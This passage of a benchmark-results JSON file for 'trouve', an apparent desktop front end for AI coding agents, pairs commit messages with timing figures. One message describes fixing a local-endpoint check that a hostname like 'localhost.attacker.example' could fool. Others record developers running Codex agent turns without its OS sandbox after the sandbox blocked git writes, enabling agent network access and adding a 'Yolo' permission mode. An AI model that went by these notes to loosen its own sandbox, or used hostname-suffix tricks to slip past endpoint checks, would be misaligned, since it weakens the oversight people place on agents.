localhost.attacker.example and would have enabled\n  offline prompts against endpoints that still need the internet.\n  build_provider's keyless-local check now shares the same parser.\n  Regression tests cover the hostname-suffix tricks.\n- ServerConnectionLost/Restored revalidate client.info() before\n  applying: the watchdog and child watcher enqueue independently, so a\n  queued transition can be stale and must not unblock a dead server or\n  re-block a recovered one.\n- A respawned server that never becomes ready is killed and reaped\n  instead of lingering unwatched; ownership moves to the child watcher\n  only after readiness.\n- Automations Pause/Resume and Delete gate on !root.blocked like Run\n  now and Edit.\n- DropUpPicker and SearchPicker close their popup when disabled and\n  ignore clicks/Enter inside an already-open popup, so a mid-\n  interaction disconnect can't submit through a stale popup.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Make connectivity blocking authoritative in the command loop\n\nThe UI disabling controls is cosmetic: a command already queued when\nconnectivity flipped (or a click racing the banner) still reached the\nclient. A shared connectivity_blocked() predicate now feeds both the\nbanner gate and an early rejection in handle() for prompt, queue, and\nautomation commands, so the two sides can't disagree.\n\nOn the UI side the queued-prompt panel now disables drag, reorder,\nedit, save, and delete alongside Send now while blocked, and a\nmid-drag or mid-edit connectivity loss drops the drag state and the\nopen editor instead of leaving them stuck.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Gate composer knob changes behind the connectivity block too\n\nThe mode/model/thinking/context/fast pickers were only UI-disabled\nwhile blocked; a queued command racing the flip could still mutate the\nthread's model and options through update_current_thread. They now sit\nin the same authoritative rejection list as SendMessage and the queue\ncommands. Pickers re-sync from actual thread state on reconnect, so a\nrejected change can't leave them silently drifted.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-16T18:07:34-04:00",
          "tree_id": "94f1e14456bf8490f3834a93deca40c468b01156",
          "url": "https://github.com/jimsimon/trouve/commit/df291297455e495895baf13dd73de45d176fa3b2"
        },
        "date": 1784239779166,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4893501.45,
            "range": "± 12909",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36938.99441941942,
            "range": "± 13",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3011972.4117647056,
            "range": "± 1449",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1374265.0645586299,
            "range": "± 7451",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "479651d54acf0500041f4cbc74e51416e28e78a5",
          "message": "Prefer the Skia renderer to fix screen artifacts while typing (#57)\n\nThe default FemtoVG renderer corrupts its glyph atlas on some Linux\ndrivers, flashing garbage across the window whenever text changes\n(typing) or the window repaints (e.g. a desktop notification appearing).\nRequest Skia at startup, fall back to the default selection if it can't\ninitialize, and leave the choice alone when SLINT_BACKEND is set —\nBackendSelector only reads the env var for requirements left unset.\n\nCo-authored-by: Claude Fable 5 <noreply@anthropic.com>",
          "timestamp": "2026-07-16T19:27:12-04:00",
          "tree_id": "d6180a19c46aac5cd9b14088f5620cae26de5604",
          "url": "https://github.com/jimsimon/trouve/commit/479651d54acf0500041f4cbc74e51416e28e78a5"
        },
        "date": 1784244651347,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4867041.818181818,
            "range": "± 9421",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37113.87608932462,
            "range": "± 9",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3011513.4117647056,
            "range": "± 6461",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1363207.825,
            "range": "± 7188",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "c79062285dc0278bc75f97c7220664ab331fea06",
          "message": "Show the OAuth device code in Settings → Integrations (#58)\n\nThe GitHub sign-in button lives in the Integrations section, but the\n\"opening browser — enter code XXXX-XXXX at …\" status the controller\nreports only rendered in the Providers and Agents sections, so the\ndevice code GitHub asks for was never shown. Render settings-status in\nthe Integrations section too.\n\nCo-authored-by: Claude Fable 5 <noreply@anthropic.com>",
          "timestamp": "2026-07-16T22:53:16-04:00",
          "tree_id": "738d818da58a0e29a7943c935b19e8a3b7032cf2",
          "url": "https://github.com/jimsimon/trouve/commit/c79062285dc0278bc75f97c7220664ab331fea06"
        },
        "date": 1784256921791,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5084964.5,
            "range": "± 7984",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 35743.738394258806,
            "range": "± 15",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2868513.5555555555,
            "range": "± 1393",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1547696.2589285714,
            "range": "± 12363",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "32d6ff98eb790a4f765097f08cb2da83d7963436",
          "message": "Embed trouve-server in-process in the desktop app (ADR 0008) (#61)\n\n* Embed trouve-server in-process in the desktop app (ADR 0008)\n\nThe app spawned trouve-server as a child binary, which meant `cargo run\n--bin trouve` ran against a missing or stale sibling binary, dev builds\nneeded a separate `cargo build -p trouve-server`, and the child-process\nmodel could never ship on iOS (no exec). The protocol boundary — the\nload-bearing part of ADR 0002 — never required a process boundary.\n\ntrouve-server now exposes one bootstrap entry point, bind_local(), that\nwires the full local stack and returns the bound address plus the serve\nfuture. The app spawns that future on its runtime with a per-launch\ntoken (ServerSecurity::with_token) and speaks loopback HTTP+SSE exactly\nas before; the dependency graph still enforces invariant 1 because the\napp depends only on trouve-server, never trouve-core. The standalone\nbinary remains (a thin main over bind_local) for hosted/self-hosted\nuse, and TROUVE_SERVER_URL still targets external servers.\n\nDeleted with the child process: sibling-binary lookup and\nTROUVE_SERVER_BIN, the port-reservation race, PR_SET_PDEATHSIG (and the\nlibc dep), kill-on-drop plumbing. The crash-restart logic carries over\nagainst the embedded task. Trade-off (recorded in the ADR): a hard\nserver crash now takes the UI down; panics are contained by the task\nboundary and restarted.\n\nCo-Authored-By: Claude Fable 5 <noreply@anthropic.com>\n\n* Update docs/adr/0002-protocol-first-client-server-split.md\n\nCo-authored-by: coderabbitai[bot] <136622811+coderabbitai[bot]@users.noreply.github.com>\n\n* fix: apply CodeRabbit auto-fixes\n\nFixed 1 file(s) based on 1 unresolved review comment.\n\nCo-authored-by: CodeRabbit <noreply@coderabbit.ai>\n\n* Fix rustfmt after CodeRabbit auto-fix on controller.rs.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Await embedded server shutdown after readiness failures.\n\nAborting the serve task alone can leave the listener running; join\nbefore returning startup errors or giving up on restart.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n---------\n\nCo-authored-by: Claude Fable 5 <noreply@anthropic.com>\nCo-authored-by: coderabbitai[bot] <136622811+coderabbitai[bot]@users.noreply.github.com>\nCo-authored-by: CodeRabbit <noreply@coderabbit.ai>\nCo-authored-by: Cursor <cursoragent@cursor.com>",
          "timestamp": "2026-07-16T23:41:51-04:00",
          "tree_id": "a89f3ca44eaa184abc0466f3737a8aa5b4c6d11f",
          "url": "https://github.com/jimsimon/trouve/commit/32d6ff98eb790a4f765097f08cb2da83d7963436"
        },
        "date": 1784259931736,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4895847.227272727,
            "range": "± 6493",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36945.20317921408,
            "range": "± 15",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3030108.882352941,
            "range": "± 1183",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1391737.7302591922,
            "range": "± 8827",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "364b49916ee19ec835672e0d8d187619ea89d30a",
          "message": "Require a path argument to register a workspace on startup. (#62)\n\n* Require a path argument to register a workspace on startup.\n\nAuto-registering CWD caused session worktrees launched from\n~/.local/share/trouve/worktrees/ to appear as separate workspaces.\nUse `trouve .` or `trouve /path/to/repo` to opt in; plain `trouve`\nloads existing workspaces only.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Update crates/trouve-app/src/controller.rs\n\nCo-authored-by: coderabbitai[bot] <136622811+coderabbitai[bot]@users.noreply.github.com>\n\n* Apply rustfmt to controller.rs\n\nCo-Authored-By: Claude Fable 5 <noreply@anthropic.com>\n\n---------\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\nCo-authored-by: coderabbitai[bot] <136622811+coderabbitai[bot]@users.noreply.github.com>\nCo-authored-by: Claude Fable 5 <noreply@anthropic.com>",
          "timestamp": "2026-07-18T02:27:41-04:00",
          "tree_id": "ba1430a5314a12d115c8df78472c717d9f306b74",
          "url": "https://github.com/jimsimon/trouve/commit/364b49916ee19ec835672e0d8d187619ea89d30a"
        },
        "date": 1784356194379,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4897306.15,
            "range": "± 14038",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37379.050783295075,
            "range": "± 12",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3069423.676470588,
            "range": "± 3826",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1378940.9270405837,
            "range": "± 5533",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "07bc80d5b9eb3912e4b51d3f9c702ed4541dafc0",
          "message": "Add a global default permissions setting to Modes & Models (#63)\n\n* Add a global default permissions setting to Modes & Models\n\nSettings → Modes & Models gains a \"Global default permissions\" picker\n(Ask / Allow list / Yolo) applied to new threads whose mode has no\npermission default of its own. Per-mode permissions now default to\n\"Global default\" and remain overridable in the mode editor, mirroring\nthe existing global/per-mode default-model pattern.\n\nA mode's default_permission_mode is now optional (absent = global\ndefault); the global value persists in config.toml, is settable via\nPUT /v1/config/default-permission-mode, and rides on GET /v1/providers\nalongside the default model.\n\nCo-Authored-By: Claude Fable 5 <noreply@anthropic.com>\n\n* Address PR review feedback for global default permissions.\n\nBump PROTOCOL_VERSION to 0.20 for the optional default_permission_mode\nschema change, guard invalid permission picker indices like the model\npicker, and clarify changelog migration behavior for existing modes.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n---------\n\nCo-authored-by: Claude Fable 5 <noreply@anthropic.com>\nCo-authored-by: Cursor <cursoragent@cursor.com>",
          "timestamp": "2026-07-18T02:53:07-04:00",
          "tree_id": "0c26fdec871409df950313352bdb353df36540ec",
          "url": "https://github.com/jimsimon/trouve/commit/07bc80d5b9eb3912e4b51d3f9c702ed4541dafc0"
        },
        "date": 1784357712198,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4886419.300000001,
            "range": "± 12850",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37122.93281443123,
            "range": "± 13",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3007641.3823529407,
            "range": "± 1403",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1378680.4790234445,
            "range": "± 6215",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "60f81e243a669e08103bc23a5750f3c602468da1",
          "message": "Fix Codex tool approvals replying with obsolete decision values (#65)\n\n* Fix Codex app-server approval replies to use accept/decline.\n\nThe Codex app-server protocol no longer recognizes approved/denied\ndecision values, so user approvals were treated as rejections.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add Codex adapter test for denied approval replies.\n\nCover the decline path so approval mapping stays paired with the existing accept case.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n---------\n\nCo-authored-by: Cursor <cursoragent@cursor.com>",
          "timestamp": "2026-07-18T03:50:46-04:00",
          "tree_id": "cd43fedde527f1048effc174a53273c956ec652b",
          "url": "https://github.com/jimsimon/trouve/commit/60f81e243a669e08103bc23a5750f3c602468da1"
        },
        "date": 1784361174992,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4872325.6,
            "range": "± 9547",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37109.397487487484,
            "range": "± 18",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3050504.3529411764,
            "range": "± 1468",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1369117.3166666667,
            "range": "± 9604",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "84a9c92c5b5b73e53a5632de1e152a27c7d1b542",
          "message": "Fix backend approvals that arrive before the tool card (#64)\n\n* Fix backend approvals that arrive before the tool card exists.\n\nCursor and Codex can emit permission requests before the tool_call event\nthat normally creates the UI card, leaving Approve/Deny with nowhere to\nattach and wedging the turn. Synthesize a tool.requested card when needed\nand honor turn cancellation during the approval wait.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Set requires_approval on synthetic backend tool cards.\n\nMatch bridged_approval so cards render as awaiting approval before\napproval.requested is processed, not only after the status flip.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Harden backend approval cancellation and duplicate tool cards.\n\nSkip TurnCompleted when a backend turn is cancelled so drain_queue can\nemit turn.cancelled alone. Reuse synthetic approval cards when the\nvendor's tool_started arrives later, and keep them actionable until\napproval resolves.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Address review feedback on backend approval edge cases.\n\nScope tool-card dedup to the active turn, persist partial assistant\ntext on cancelled backend turns, handle turn.cancelled in the viewmodel,\nand keep terminal tool cards stable when vendor events arrive late.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n---------\n\nCo-authored-by: Cursor <cursoragent@cursor.com>",
          "timestamp": "2026-07-18T15:56:14-04:00",
          "tree_id": "74de43f89adc7a08939b8518557a49deeaa55d5b",
          "url": "https://github.com/jimsimon/trouve/commit/84a9c92c5b5b73e53a5632de1e152a27c7d1b542"
        },
        "date": 1784404708803,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4927947.388888889,
            "range": "± 6141",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36978.81617923818,
            "range": "± 10",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3018485.617647059,
            "range": "± 1663",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1341838.49122807,
            "range": "± 8046",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "a3add2bd8d8ff663fd49ecb24637179af2f50c2a",
          "message": "Fix scroll bookmarks bleeding between sessions on switch (#66)\n\n* Fix scroll bookmarks bleeding between sessions on switch\n\nThe shell's 1 Hz scroll poll sent a bare ChatScrolled(f32); the\ncontroller booked the sample against whatever thread was current when\nthe message was processed. Around a session/thread switch the two\ndiffer, so the outgoing thread's viewport offset (sampled up to a\nsecond earlier) was written into the incoming thread's resume\nbookmark.\n\nAttribute each sample where it's taken instead: the chat list now\ncarries a chat-thread-key property written in the same event as the\nrow swap, the poll reads key and offset in one event-loop turn, and\nChatScrolled carries the sampled thread id which the controller books\ndirectly. As a side effect the outgoing thread's final position is now\nsaved correctly even when its sample arrives after the switch.\n\nCo-Authored-By: Claude Fable 5 <noreply@anthropic.com>\n\n* Format ChatScrolled variant per rustfmt\n\nCo-Authored-By: Claude Fable 5 <noreply@anthropic.com>\n\n---------\n\nCo-authored-by: Claude Fable 5 <noreply@anthropic.com>",
          "timestamp": "2026-07-18T16:16:56-04:00",
          "tree_id": "10003ed260ef525f1eb16b99c6de81076f59caee",
          "url": "https://github.com/jimsimon/trouve/commit/a3add2bd8d8ff663fd49ecb24637179af2f50c2a"
        },
        "date": 1784405947740,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5034245.166666667,
            "range": "± 6114",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 35645.758436853,
            "range": "± 8",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2857367.972222222,
            "range": "± 1127",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1491201.100931677,
            "range": "± 7726",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "1137b36f152d421ef195b9fc30b30ed432055e4e",
          "message": "Enable network access for Codex turns (#67)\n\n* Enable network access for Codex turns\n\n* fix: apply CodeRabbit auto-fixes\n\nFixed 1 file(s) based on 1 unresolved review comment.\n\nCo-authored-by: CodeRabbit <noreply@coderabbit.ai>\n\n---------\n\nCo-authored-by: coderabbitai[bot] <136622811+coderabbitai[bot]@users.noreply.github.com>\nCo-authored-by: CodeRabbit <noreply@coderabbit.ai>",
          "timestamp": "2026-07-18T20:27:05-04:00",
          "tree_id": "c7c0d868d1bce42416bf4fe387a9e2f60ac74db7",
          "url": "https://github.com/jimsimon/trouve/commit/1137b36f152d421ef195b9fc30b30ed432055e4e"
        },
        "date": 1784420955777,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5099036.833333334,
            "range": "± 9600",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36845.82039411206,
            "range": "± 13",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3031748.470588235,
            "range": "± 1559",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1355729.6705882354,
            "range": "± 5119",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "cc782e8c7eca25a8250b892aa4b24248a9bb79f9",
          "message": "Make workspace headers reorderable (#68)\n\n* Make workspace headers reorderable\n\n* fix: apply CodeRabbit auto-fixes\n\nFixed 1 file(s) based on 1 unresolved review comment.\n\nCo-authored-by: CodeRabbit <noreply@coderabbit.ai>\n\n---------\n\nCo-authored-by: coderabbitai[bot] <136622811+coderabbitai[bot]@users.noreply.github.com>\nCo-authored-by: CodeRabbit <noreply@coderabbit.ai>",
          "timestamp": "2026-07-18T21:30:08-04:00",
          "tree_id": "84cf93b2dc27fab5494433ee77786b08a7e9199d",
          "url": "https://github.com/jimsimon/trouve/commit/cc782e8c7eca25a8250b892aa4b24248a9bb79f9"
        },
        "date": 1784424734291,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4898904.15,
            "range": "± 13981",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36902.42307374338,
            "range": "± 16",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3002875.176470588,
            "range": "± 1103",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1389135.4303144447,
            "range": "± 8763",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "3c8897ca2d828ccfcdb0d89ac08cf6f50536e241",
          "message": "Update dependency typescript to v7 (#42)\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>",
          "timestamp": "2026-07-18T21:31:43-04:00",
          "tree_id": "12d8bd669ab16d9a934106343ce5b38378c30020",
          "url": "https://github.com/jimsimon/trouve/commit/3c8897ca2d828ccfcdb0d89ac08cf6f50536e241"
        },
        "date": 1784424889703,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4994809.611111111,
            "range": "± 10786",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36905.82658227848,
            "range": "± 10",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3029251.823529412,
            "range": "± 1000",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1355189.3615196077,
            "range": "± 8758",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "2d5ff980f06a6fdd1d876ab551762b19d5cc75d3",
          "message": "Surface Claude subscription limit errors (#69)\n\n* Surface Claude subscription limit errors\n\n* fix: apply CodeRabbit auto-fixes\n\nFixed 1 file(s) based on 1 unresolved review comment.\n\nCo-authored-by: CodeRabbit <noreply@coderabbit.ai>\n\n* Format Claude error result tests\n\n---------\n\nCo-authored-by: coderabbitai[bot] <136622811+coderabbitai[bot]@users.noreply.github.com>\nCo-authored-by: CodeRabbit <noreply@coderabbit.ai>",
          "timestamp": "2026-07-18T23:01:05-04:00",
          "tree_id": "6477d66e46b2194071b5c82e608c6fb95350ed13",
          "url": "https://github.com/jimsimon/trouve/commit/2d5ff980f06a6fdd1d876ab551762b19d5cc75d3"
        },
        "date": 1784430293437,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5095557.65,
            "range": "± 23051",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36979.52400793651,
            "range": "± 22",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3016359.0588235296,
            "range": "± 1586",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1391201.3702307008,
            "range": "± 15635",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "5b51fc315936c809889f3a97baf37ca4bf081eb6",
          "message": "Show completed Codex reasoning messages (#71)",
          "timestamp": "2026-07-19T00:09:45-04:00",
          "tree_id": "dc06865bce5082879a064a74a46b3d3ee10d2db8",
          "url": "https://github.com/jimsimon/trouve/commit/5b51fc315936c809889f3a97baf37ca4bf081eb6"
        },
        "date": 1784434406467,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5435795.666666667,
            "range": "± 7989",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36329.20540816327,
            "range": "± 10",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2863750.0555555555,
            "range": "± 2003",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1553028.576867816,
            "range": "± 16265",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "4b91ef782469c7a303d0a7978eb385e6f7b74efc",
          "message": "Add configurable thinking defaults (#75)\n\nPersist a global thinking level and optional per-mode overrides. Resolve inherited levels through each selected model schema so unsupported controls stay hidden and provider-specific keys remain correct.",
          "timestamp": "2026-07-19T03:59:39-04:00",
          "tree_id": "0978450ec76c9c0a7420812f2c54d8aae38c1b5a",
          "url": "https://github.com/jimsimon/trouve/commit/4b91ef782469c7a303d0a7978eb385e6f7b74efc"
        },
        "date": 1784448206621,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5578230,
            "range": "± 9357",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36067.438515643946,
            "range": "± 202",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2941145.194444444,
            "range": "± 16332",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1573245.3262108262,
            "range": "± 13220",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "81e68be4ee24d96c853c0e13cc662ef52a2c3da4",
          "message": "Release Codex waiters when app-server exits (#73)",
          "timestamp": "2026-07-19T04:04:24-04:00",
          "tree_id": "230cbef346ca6e78c913ca4c16368e07f11ac325",
          "url": "https://github.com/jimsimon/trouve/commit/81e68be4ee24d96c853c0e13cc662ef52a2c3da4"
        },
        "date": 1784448397800,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4995776.2,
            "range": "± 22305",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 30381.5785333088,
            "range": "± 37",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2641630.2105263155,
            "range": "± 3845",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 954251.7680704899,
            "range": "± 2378",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "85ddf1d0968fe08dd096bc0fdf84adf3fa07ec63",
          "message": "Allow Codex Git writes in mutable modes (#76)\n\nCodex workspace-write makes linked worktree metadata read-only, so even index locks fail. Run mutable Codex turns without its OS sandbox while preserving Ask approvals and the read-only sandbox.",
          "timestamp": "2026-07-19T04:05:44-04:00",
          "tree_id": "b9b9361e691bb53d84f79eb8f41558e4b650ef72",
          "url": "https://github.com/jimsimon/trouve/commit/85ddf1d0968fe08dd096bc0fdf84adf3fa07ec63"
        },
        "date": 1784448527211,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5161549.050000001,
            "range": "± 14716",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36894.469001421836,
            "range": "± 5",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2842177.972222222,
            "range": "± 1707",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1567714.0028846152,
            "range": "± 15831",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "7c4abc8bfa0c0ca9371e93736b9a426bf5c280e9",
          "message": "Reduce dev build debuginfo to shrink target dirs (#94)\n\nDev builds used cargo defaults: full DWARF for every crate, which made\neach session worktree's target/ run 20-30 GB. Line tables keep\nbacktraces and panic locations useful for workspace crates; dependency\ndebuginfo is dropped entirely.\n\nCo-authored-by: Claude Fable 5 <noreply@anthropic.com>",
          "timestamp": "2026-07-19T04:17:54-04:00",
